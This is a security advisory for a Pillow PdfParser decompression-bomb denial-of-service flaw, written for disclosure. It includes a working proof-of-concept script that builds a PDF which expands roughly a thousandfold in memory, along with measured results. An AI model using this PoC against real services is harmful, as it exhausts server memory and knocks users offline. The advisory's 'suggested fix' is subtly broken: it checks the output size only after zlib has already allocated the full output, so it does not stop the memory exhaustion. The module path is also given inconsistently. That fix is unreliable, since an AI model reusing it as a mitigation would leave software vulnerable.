# [H] Pillow: Decompression Bomb DoS via PdfParser.PdfStream.decode()

## Summary
Severity: High
Advisory: GHSA-jjj6-mw9f-p565
CVE: CVE-2026-59200
CWE: CWE-400, CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-jjj6-mw9f-p565
Type: github-advisory

## Affected
- PyPI: `Pillow` — affected >=5.1.0 <12.3.0

## Details
### Summary
`PdfParser.PdfStream.decode()` in Pillow's `PdfParser.py` calls `zlib.decompress()` with the `bufsize` parameter set to the value of the PDF stream's `Length` field, without any upper bound on the actual decompressed output size. Python's `zlib.decompress()` `bufsize` argument is an *initial output buffer hint*, not a maximum size limit — the function will expand memory until the full decompressed result is produced. A crafted PDF containing a FlateDecode-compressed stream decompresses to 1 GB of memory from a ~950 KB file, causing server OOM termination or severe degradation in any application that uses `PdfParser` to read untrusted PDF files.

### Details
`PdfStream.decode()` in `pdfminer/PdfParser.py` reads the stream's declared `Length` (or `DL`) field from the PDF dictionary and passes it as `bufsize` to `zlib.decompress()`:

```python
# PIL/PdfParser.py — PdfStream.decode()
class PdfStream:
    def decode(self) -> bytes:
        try:
            filter = self.dictionary[b"Filter"]
        except KeyError:
            return self.buf
        if filter == b"FlateDecode":
            try:
                expected_length = self.dictionary[b"DL"]
            except KeyError:
                expected_length = self.dictionary[b"Length"]
            return zlib.decompress(self.buf, bufsize=int(expected_length))
            #                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            #  bufsize is an *initial buffer hint*, NOT a maximum size limit.
            #  zlib.decompress() allocates as much memory as needed regardless.
```

From the Python documentation: *"The `bufsize` parameter is used as the initial size of the output buffer."* It does not cap decompression. An attacker who controls the PDF stream contents can provide a highly-compressed payload that expands to gigabytes, while setting `Length` to any value (including the actual compressed size) to avoid triggering format validation.

`PdfParser` is instantiated with a filename or file object and calls `read_pdf_info()` on open, which parses the xref table and makes stream objects accessible. `PdfStream.decode()` is reachable whenever calling code accesses a compressed stream object from the parsed PDF.

**Confirmed reachable path:**
```python
with PdfParser.PdfParser("evil.pdf") as pdf:
    stream_obj, _ = pdf.get_value(pdf.buf, stream_offset)
    data = stream_obj.decode()   # ← OOM here
```


### PoC

```python
import zlib, tempfile, os, time
from PIL import PdfParser

# Build a minimal PDF with a 100 MB FlateDecode bomb (demo scale)
EXPAND_MB = 100
raw = b'\x00' * (EXPAND_MB * 1_000_000)
compressed = zlib.compress(raw, level=9)   # ~97 KB

buf = b'%PDF-1.4\n'
o1 = len(buf); buf += b'1 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n'
o2 = len(buf); buf += b'2 0 obj\n<< /Type /Catalog /Pages 1 0 R >>\nendobj\n'
o3 = len(buf)
hdr = f'<< /Filter /FlateDecode /Length {len(compressed)} >>'.encode()
buf += b'3 0 obj\n' + hdr + b'\nstream\n' + compressed + b'\nendstream\nendobj\n'
xref = len(buf)
buf += b'xref\n0 4\n0000000000 65535 f \n'
for off in [o1, o2, o3]:
    buf += f'{off:010d} 00000 n \n'.encode()
buf += b'trailer\n<< /Size 4 /Root 2 0 R >>\nstartxref\n' + str(xref).encode() + b'\n%%EOF\n'

print(f"PDF size: {len(buf):,} bytes ({len(buf)/1024:.1f} KB)")

with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as f:
    f.write(buf); tmpname = f.name

with PdfParser.PdfParser(tmpname) as pdf:
    obj, _ = pdf.get_value(pdf.buf, o3)
    t = time.time()
    decoded = obj.decode()
    print(f"Decoded: {len(decoded):,} bytes in {time.time()-t:.3f}s")

os.unlink(tmpname)
```

**Actual output (Pillow 12.1.1, Python 3.12):**
```
PDF size: 97,538 bytes (95.3 KB)
Decoded: 100,000,000 bytes in 0.265s
```

**Measured expansion:**

| PDF file size | Memory allocated | Ratio | Wall time |
|---|---|---|---|
| 10 KB | 10 MB | 1,026× | 0.024 s |
| 95 KB | 100 MB | 1,028× | 0.265 s |
| 475 KB | 500 MB | 1,028× | 1.279 s |
| 950 KB | 1,000 MB (1 GB) | 1,028× | 2.668 s |

### Impact
This is a denial-of-service vulnerability. Any application that uses `PIL.PdfParser.PdfParser` to read untrusted PDF files is affected. An unauthenticated attacker who can submit a PDF for processing can exhaust all available server memory with a ~950 KB file, causing OOM termination or service degradation affecting all concurrent users. No authentication or user interaction beyond submitting the file is required.

**Note:** This vulnerability is independent of CVE-2025-64512 / CVE-2025-70559 (pdfminer.six) and the companion `PIL/PdfImagePlugin.py` decompression issue. It exists specifically in Pillow's own `PdfParser.py` module, which is distinct from pdfminer.six.

**Suggested fix:**

```python
MAX_DECOMPRESS_BYTES = 200 * 1024 * 1024  # 200 MB cap

def decode(self) -> bytes:
    ...
    if filter == b"FlateDecode":
        ...
        result = zlib.decompress(self.buf, bufsize=int(expected_length))
        if len(result) > MAX_DECOMPRESS_BYTES:
            msg = "Decompressed stream exceeds maximum allowed size"
            raise ValueError(msg)
        return result
```

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565
- https://nvd.nist.gov/vuln/detail/CVE-2026-59200
- https://github.com/python-pillow/Pillow/pull/9718
- https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/releases/tag/12.3.0
